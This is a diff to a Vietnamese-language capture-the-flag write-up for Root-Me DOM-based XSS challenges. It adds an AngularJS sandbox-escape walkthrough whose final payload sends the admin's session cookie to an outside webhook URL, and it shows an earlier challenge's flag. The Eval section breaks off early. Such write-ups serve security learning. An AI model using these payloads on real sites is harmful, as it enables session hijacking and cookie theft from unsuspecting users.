@@ -147,3 +147,35 @@ Payload: `http://challenge01.root-me.org/web-client/ch32/?number=';document.loca
 
 ## Flag
 `rootme{XSS_D0M_BaSed_InTr0}`
+# XSS DOM Based - AngularJS
+Another angle
+
+**Statement:** Steal the admin’s session cookie.
+## Cách làm
+Truy cập link http://challenge01.root-me.org/web-client/ch35/ thử submit:
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/3afa7869-3bc9-423c-99f2-4c56177356ab)
+
+Kiểm tra thử với `'; alert(1);//`:
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/2b366965-720b-456c-83de-84e1ff4f16ac)
+
+Có thể thấy dấu nháy đơn đã bị lọc bỏ, và input được hiển thị trong `Result for`. Đề bài có tên là `AngularJS`, rất có thể đoạn code sẽ là `Result for {{name}}` (Để khiến JS thực thi command, ta chèn `{{ }}` để triển khai expression).
+
+Tra cứu cheatsheet XSS Angular, ta có thể tìm thấy payload: `{{$on.constructor("alert(1)")()}}` 
+
+(sử dụng hàm khởi tạo trong angular để có thể thực thi đoạn mã javascript bên trong ngoặc tròn)
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/e5e45d26-bb08-4e7b-adf1-3641ca97c614)
+
+Payload: `{{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa".concat(document.cookie)&#x27)()}}`
+
+
+# XSS DOM Based - Eval
+A bad practice ...
+
+**Statement: **Steal the admin’s session cookie.
+## Cách làm
+Truy cập link http://challenge01.root-me.org/web-client/ch34/ thấy có một trường yêu cầu nhập phép toán
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/62cc4d64-708c-4acc-8ebf-e5d272e21d1f)
